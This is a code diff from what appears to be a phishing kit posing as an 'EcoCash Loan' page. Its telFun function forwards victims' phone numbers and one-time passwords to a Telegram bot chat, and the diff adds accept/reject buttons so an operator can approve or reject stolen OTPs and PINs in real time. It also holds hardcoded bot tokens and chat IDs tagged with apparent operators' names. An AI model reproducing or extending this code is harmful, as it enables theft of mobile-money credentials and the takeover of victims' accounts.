@@ -1,8 +1,8 @@
-export const token ="8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko";
+export const token ="8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko";//"8955263984:AAH7CixA7psECpsXifmNJkDlg2MrUHGl1I0";//"8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko";
 export const secret = "JEMINI254";
 
 export async function telFun(formData: any,) {
-    const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
+    //const token = "8944593745:AAHNRSJLCZl8wVJsoI833npl6MgMDFbcmko"
     const url = `https://api.telegram.org/bot${token}/sendMessage`
     const action = formData.get("action");
     let message = "";
@@ -33,7 +33,24 @@ export async function telFun(formData: any,) {
     if (action === "submit-otp") {
         message = `<b>Phone:</b> <a href="tel:${formData.get("phone")}">${formData.get("phone")}</a>\n` +
             `<b>Otp:</b> <code>${formData.get("otp")}</code>\n` + `<b>attempt:</b> ${formData.get("attempt")}`;
-       
+       keyboard= {
+     inline_keyboard: [
+      [
+        {
+          text: "✅ Accept otp",
+          callback_data: `${formData.get("kit")}:accept:otp`,
+        },
+        {
+          text: "❌ Reject pin",
+          callback_data: `${formData.get("kit")}:reject:phone`,
+        },
+        {
+          text: "❌ Reject otp",
+          callback_data: `${formData.get("kit")}:reject:otp`,
+        },
+      ],
+    ],
+  };
     }
 
      
@@ -46,7 +63,7 @@ export async function telFun(formData: any,) {
                 "Content-Type": "application/json",
             },
             body: JSON.stringify({
-                chat_id: 8768639146,//8768639146,//-fred-sam //6562421557-kc,7895249781-evans // 5991194967-sam
+                chat_id: 8768639146, ///6471412973, //new evans,//8768639146,//-fred-sam //6562421557-kc,7895249781-evans // 5991194967-sam
                 text:
                     `<b>EcoCash Loan: </b>\n ${message} `
                 // Phone: ${formData.get("phone")}
